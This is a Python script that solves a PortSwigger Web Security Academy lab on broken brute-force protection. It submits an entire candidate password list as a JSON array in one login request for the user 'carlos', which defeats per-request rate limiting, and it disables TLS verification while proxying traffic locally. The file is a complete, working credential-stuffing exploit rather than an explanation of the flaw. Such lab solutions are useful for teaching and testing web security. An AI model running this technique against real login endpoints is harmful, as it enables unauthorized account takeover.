#!/usr/bin/env python3
# Lab: Broken brute-force protection, multiple credentials per request
# Lab-Link: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
# Difficulty: EXPERT
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    print('[+] Lab: Broken brute-force protection, multiple credentials per request')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force username and password')
    passwords = []
    with open('../candidate_passwords.txt') as f:
        for line in f:
            passwords.append(line.rstrip())

    json = {"username": "carlos",
            "password": passwords,
            "": ""}
    r = requests.post(f'{host}/login', json=json, verify=False, allow_redirects=True, proxies=proxies)
    if 'Your username is: carlos' in r.text:
        print(f'[+] Login successful, lab solved')
    else:
        print(f'[-] Login not successful')


if __name__ == "__main__":
    main()
